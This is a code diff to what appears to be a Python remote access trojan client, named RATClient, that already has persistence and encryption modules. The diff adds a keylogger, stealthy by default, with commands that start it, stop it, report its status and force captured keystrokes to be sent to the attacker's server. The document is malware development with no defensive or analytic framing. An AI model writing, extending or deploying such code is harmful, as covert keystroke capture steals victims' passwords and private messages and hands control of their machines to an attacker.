@@ -8,6 +8,7 @@ from encryptor import Encryptor
 from persistence import PersistenceManager
 from protocol import Protocol
 from process_manager import ProcessManager
+from keylogger import Keylogger
 
 
 
@@ -24,6 +25,9 @@ class RATClient:
         self.server_url = HOST
         self.registered = False
         self.encryptor = Encryptor(ENCRYPTION_KEY)
+        
+        self.keylogger = Keylogger(self.encryptor, self.client_id, self.server_url)
+        self.keylogger_enabled = False
                 
 
 
@@ -121,6 +125,8 @@ class RATClient:
             
         except Exception as e:
             return False
+        
+
 
 
     def handle_process_command(self, command_data):
@@ -149,6 +155,22 @@ class RATClient:
                 )
             elif action == "get_system_info":
                 result = self.process_manager.get_system_info()
+            elif action == "start_keylogger":
+                result = self.keylogger.start(stealth=data.get('stealth', True))
+                if result["success"]:
+                    self.keylogger_enabled = True
+            elif action == "stop_keylogger":
+                result = self.keylogger.stop()
+                if result["success"]:
+                    self.keylogger_enabled = False
+            elif action == "get_keylogger_status":
+                result = self.keylogger.get_status()
+            elif action == "get_keylog_data":
+                # Forcer l'envoi immédiat des logs
+                if self.keylogger.log_buffer:
+                    self.keylogger.send_logs_sync(self.keylogger.log_buffer.copy())
+                    self.keylogger.log_buffer.clear()
+                result = {"message": "Keylog data sent to server"}
             else:
                 result = {"error": f"Unknown process action: {action}"}
             
